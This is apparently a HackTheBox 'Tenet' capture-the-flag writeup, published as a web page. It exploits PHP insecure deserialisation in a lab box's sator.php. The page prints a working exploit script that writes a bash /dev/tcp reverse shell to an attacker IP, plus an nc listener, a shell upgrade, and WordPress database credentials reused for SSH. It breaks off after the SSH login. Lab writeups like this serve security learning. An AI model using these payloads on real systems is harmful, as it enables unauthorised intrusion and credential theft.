@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://samiko.me/images/profile.jpg">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>Tenet - HackTheBox Writeup (10.10.10.223)&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Tenet - HackTheBox Writeup (10.10.10.223)">
+  
+    <meta name="description" content="Medium-difficulty Linux box about exploiting insecure deserialisation vulnerabilities in a PHP data migration program under development. Privilege escalation by exploiting a race condition between Bash variable references in an SSH backup script.">
+    <meta property="og:description" content="Medium-difficulty Linux box about exploiting insecure deserialisation vulnerabilities in a PHP data migration program under development. Privilege escalation by exploiting a race condition between Bash variable references in an SSH backup script.">
+  
+  
+    <meta property="og:image" content="https://www.hackthebox.eu/storage/avatars/6bd8b01a1b84e16a5ee2e53d070339fd.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://samiko.me/images/profile.jpg"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/6bd8b01a1b84e16a5ee2e53d070339fd.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">Tenet - HackTheBox Writeup (10.10.10.223)</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Tue, Jun 22, 2021</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+            <a href="tag/Medium">Medium</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+            <a href="tag/Insecure_Deserialisation">Insecure Deserialisation</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/WordPress">WordPress</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
+            <a href="tag/Race_Condition">Race Condition</a>
+          </span>
+        
+      </div>
+      <div>
+        Medium-difficulty Linux box about exploiting insecure deserialisation vulnerabilities in a PHP data migration program under development. Privilege escalation by exploiting a race condition between Bash variable references in an SSH backup script.
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/358fd061c7e04833a0bcb7a86144462a" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/cc1d478795814aaf857b98c1eb9d768e" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/cc1d478795814aaf857b98c1eb9d768e"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/377ee856e41147a099825b8ef411733f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/1c67f92fc25142af99c0a580120facfe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.223 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/00bff43477d2416b87ebd1fbf12cd46b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span></span></span></code></pre></li><li id="https://www.notion.so/45006a7aa7994db49cd2df3386c70367" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Targeted scan:</span></span><div id="https://www.notion.so/86f71b420a6c474ea8fe50330ae2f622" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -sC -sV -p 22,80 10.10.10.223 &gt; targeted.nmap</code></span></span></p></div><pre id="https://www.notion.so/4d2bde97a6d4411a8540a300c1e7815f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
+|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
+|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></span></code></pre><div id="https://www.notion.so/da8dc34ea194423ca639ea96a71a807c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">SSH, Apache HTTP.</span></span></p></div></li></ul><h2 id="https://www.notion.so/efe59908df344afab9246410ed200174" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/efe59908df344afab9246410ed200174"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration</span></span></h2><div id="https://www.notion.so/a2f79e7fe5d84e6b8196ca6972cb03ca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">HTTP Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/ceef0cd4fe68491291eea5871a5eb4cd" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port 80 is displaying the default Apache setup page.</span></span></li><li id="https://www.notion.so/241e3c2aa9af478eac1954530702b6af" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Adding virtual hostnames to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString"> file:</span></span><div id="https://www.notion.so/e6f5490cb4c8479790218b45e4390c42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">10.10.10.223  tenet.htb</code></span></span></p></div></li><li id="https://www.notion.so/869631de84e24c4a96c5592fa1c22fe6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Navigating to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://tenet.htb/">http://tenet.htb/</a></span><span class="SemanticString"> redirects to a WordPress blog, comment function is likely not vulnerable to XSS.</span></span></li><li id="https://www.notion.so/d1621e715bb44c7e88b95afd6b526cf7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Post by user &quot;protagonist&quot; on December 16:</span></span><pre id="https://www.notion.so/d28562c295364b7aa34f2e4acbd8b10f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>&quot;This Is Where Our Worlds Collide&quot;
+
+We’re looking for beta testers of our new time-management software, ‘Rotas’
+‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!
+For more information regarding opting-in, watch this space.</span></span></span></code></pre></li><li id="https://www.notion.so/a07efb567aa842bc89363954609ea91f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We learn that the developers are building a new time-management software named &quot;Rotas&quot;.</span></span></li><li id="https://www.notion.so/2ed09e34bde74ebb8d2de8f5e67d6b82" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The user &quot;protagonist&quot; is likely the site administrator.</span></span></li><li id="https://www.notion.so/3fac190171e74daaad837c88d2e528a6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Another post by user &quot;protagonist&quot; on December 16:</span></span><pre id="https://www.notion.so/07833353ac434a2e87ad494da0740b6c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>&quot;Migration&quot;
+
+We’re moving our data over from a flat file structure to something a bit more substantial.
+Please bear with us whilst we get one of our devs on the migration, which shouldn’t take too long.
+Thank you for your patience</span></span></span></code></pre></li><li id="https://www.notion.so/77ee4125cc554f0cb9abb15ac9435b50" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We also find out that data is being migrated from a flat file structure to something &quot;substantial&quot;.</span></span></li><li id="https://www.notion.so/31617e135317418eae92f01e11a6fbe6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Under this post, we also see a user &quot;neil&quot; commenting on the same day:</span></span><pre id="https://www.notion.so/237900f924e84aad8885695e2c48c63c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!</span></span></span></code></pre></li><li id="https://www.notion.so/d7666dbfb5ab425e81e40655c32e3d28" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Presumably a developer involved in the project, Neil is warning that a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sator.php</code></span><span class="SemanticString"> file and its backup may not be removed yet, and that the migration program is incomplete.</span></span></li></ul><h2 id="https://www.notion.so/69f5918f6146425e9c31b591a10b9fca" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/69f5918f6146425e9c31b591a10b9fca"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/962879e9fd01446ab2c7d8ecb69b5b85" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">After searching for the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sator.php</code></span><span class="SemanticString"> file on the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://tenet.htb/">http://tenet.htb/</a></span><span class="SemanticString"> host for a long time, turns out it was located in </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://10.10.10.223/sator.php">http://10.10.10.223/sator.php</a></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/4d3a010d87a64c4ea97d570312c5c6b3" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Output upon visiting the page:</span></span><pre id="https://www.notion.so/fa1dd9e2865743879e5032ab7fd2d319" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[+] Grabbing users from text file
+[] Database updated</span></span></span></code></pre></li><li id="https://www.notion.so/708655356ba24fb3b6503cee84083c75" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Neil also mentioned a backup for the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sator.php</code></span><span class="SemanticString"> file. Since there isn&#x27;t a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/backup/</code></span><span class="SemanticString"> directory on the site, let&#x27;s try adding the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.bak</code></span><span class="SemanticString"> file extension.</span></span></li><li id="https://www.notion.so/bab888399ecf4ff18e509d3f9d4ab326" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Source file of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sator.php</code></span><span class="SemanticString"> found on </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://10.10.10.223/sator.php.bak:">http://10.10.10.223/sator.php.bak:</a></span></span><pre id="https://www.notion.so/2dfbe43a37cd46179aaadbe6f054a657" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+  <span class="token keyword">class</span> <span class="token class-name-definition class-name">DatabaseExport</span>
+  <span class="token punctuation">{</span>
+  	<span class="token keyword">public</span> <span class="token variable">$user_file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'users.txt'</span><span class="token punctuation">;</span>
+  	<span class="token keyword">public</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+
+  	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  	<span class="token punctuation">{</span>
+  		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'[+] Grabbing users from text file &lt;br>'</span><span class="token punctuation">;</span>
+  		<span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">data</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Success'</span><span class="token punctuation">;</span>
+  	<span class="token punctuation">}</span>
+
+
+  	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  	<span class="token punctuation">{</span>
+  		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$this</span> <span class="token operator">-></span><span class="token property">user_file</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'[] Database updated &lt;br>'</span><span class="token punctuation">;</span>
+  	<span class="token comment">//	echo 'Gotta get this working properly...';</span>
+  	<span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arepo'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+  <span class="token variable">$databaseupdate</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token variable">$app</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatabaseExport</span><span class="token punctuation">;</span>
+  <span class="token variable">$app</span> <span class="token operator">-></span> <span class="token function">update_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter important">?></span></span></span></span></span></code></pre></li><li id="https://www.notion.so/52ffa3c8a1e441b08b4daf6b9916ce8f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Magic method </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">__destruct()</code></span><span class="SemanticString"> is using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file_put_contents()</code></span><span class="SemanticString">, which we can abuse to write arbitrary files via a PHP deserialisation attack.</span></span></li><li id="https://www.notion.so/d84d15f830c4447fa0626d87cef6c845" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Method syntax:</span></span><div id="https://www.notion.so/5837a6356b654903b337556e9999f6c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file_put_contents(file_name, contentstring, flag)</code></span></span></p></div></li><li id="https://www.notion.so/5f4ff431c81d48af96f2c1423ca02f8f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Concatenated path to the location of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">users.txt</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/e812ba32a6e0483aa69a92e599c4a462" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">__DIR__ . &#x27;/&#x27; . $this-&gt;user_file</code></span></span></p></div></li><li id="https://www.notion.so/0a4695819ff84b8b87a80c7b2a58d6a7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">users.txt</code></span><span class="SemanticString"> file is created in the same directory at </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://10.10.10.223/users.txt">http://10.10.10.223/users.txt</a></span><span class="SemanticString">, containing the string &quot;Success&quot;.</span></span></li><li id="https://www.notion.so/df0997cae1284c21890fbf06b815743b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can manipulate the unused </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$input</code></span><span class="SemanticString"> variable by sending serialised data through the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">arepo</code></span><span class="SemanticString"> parameter in a GET request.</span></span></li><li id="https://www.notion.so/5a221738e71c4c51aeaab4e8601cd306" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">As the input gets deserialized, we create a new instance of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DatabaseExport</code></span><span class="SemanticString"> and call </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file_put_contents()</code></span><span class="SemanticString"> with our specified file name and content, or in this case - a reverse shell on the webserver.</span></span></li><li id="https://www.notion.so/51813afde6f64f03be18771439a85ce1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Creating </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">exploit.php</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/656505beb7524bd1a44f641270b058b3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+  <span class="token keyword">class</span> <span class="token class-name-definition class-name">DatabaseExport</span>
+  <span class="token punctuation">{</span>
+  	<span class="token keyword">public</span> <span class="token variable">$user_file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'reverse.php'</span><span class="token punctuation">;</span>
+  	<span class="token keyword">public</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.103/6969 0>&amp;1\'");?>'</span><span class="token punctuation">;</span>
+
+  	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  	<span class="token punctuation">{</span>
+  		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user_file</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  	<span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Serialising payload with parameters:\n"</span><span class="token punctuation">;</span>
+  <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatabaseExport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\$user_file: "</span> <span class="token operator">.</span> <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">user_file</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\$data: "</span> <span class="token operator">.</span> <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n\n"</span><span class="token punctuation">;</span>
+
+  <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Encoded payload:\n"</span> <span class="token operator">.</span> <span class="token variable">$payload</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n\n"</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Sending payload to sator.php...\n"</span><span class="token punctuation">;</span>
+  <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"http://10.10.10.223/sator.php?arepo="</span> <span class="token operator">.</span> <span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Getting reverse shell...\n"</span><span class="token punctuation">;</span>
+  <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"http://10.10.10.223/reverse.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Done!\n"</span><span class="token punctuation">;</span>
+
+  <span class="token delimiter important">?></span></span></span></span></span></code></pre></li><li id="https://www.notion.so/c8a29b2b0ce0403d98dedc43d80fdbf7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Listen for reverse shell with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/19e7cbb87b3e4e58b75f905edc9bf905" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969</code></span></span></p></div></li><li id="https://www.notion.so/bf673a73031b4c10b8dc816c9139e8c5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">exploit.php</code></span><span class="SemanticString"> through a PHP interpreter, and we should get a shell as www-data:</span></span><div id="https://www.notion.so/c2478426ac174c1abf77ca36ee308d9a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/8b7c6ff071dd405b8da972dfe0c76732" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span></span></code></pre></li><li id="https://www.notion.so/920b88db11cf49a0b634f56221349eb8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">To make things easier for us, let&#x27;s upgrade our reverse shell to an interactive shell:</span></span><div id="https://www.notion.so/1c92578c2eb44f82bce86782ac6a9519" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ echo &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; &gt; /tmp/shell.py</code></span></span></p></div><div id="https://www.notion.so/71577d58bd704897b4b01211470a5c29" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ python3 /tmp/shell.py</code></span></span></p></div></li><li id="https://www.notion.so/536d2fd9602d45b79dd029f9b4551964" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Since this is a WordPress site, we can extract the MySQL server credentials from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">~/wordpress/wp-config.php</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/70fd2faea3694786951109131cf7d536" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'neil'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Opera2112'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span></code></pre></li><li id="https://www.notion.so/46ae031c65c04e0db4da0d34e64c28bf" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found MySQL credentials:</span></span><div id="https://www.notion.so/8558752512004bb0a52dd69deff3dcd7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">neil:Opera2112</code></span></span></p></div></li><li id="https://www.notion.so/0bdaf176b0a84b0fa61d8b5c1f3ae30a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Trying to SSH in as neil:</span></span><div id="https://www.notion.so/d218b73a6da74b1a9325b6b480d268ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh neil@10.10.10.223</code></span></span></p></div></li><li id="https://www.notion.so/3ab8493b6a494a9d9f7b9564aaf2461c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looks like Neil is lazy and reused his password for his SSH credentials:</span></span><div id="https://www.notion.so/b7b40da25499422a92fa87fd8500260b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/752dcbeefd254e8b9b827c6758ba198d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>neil
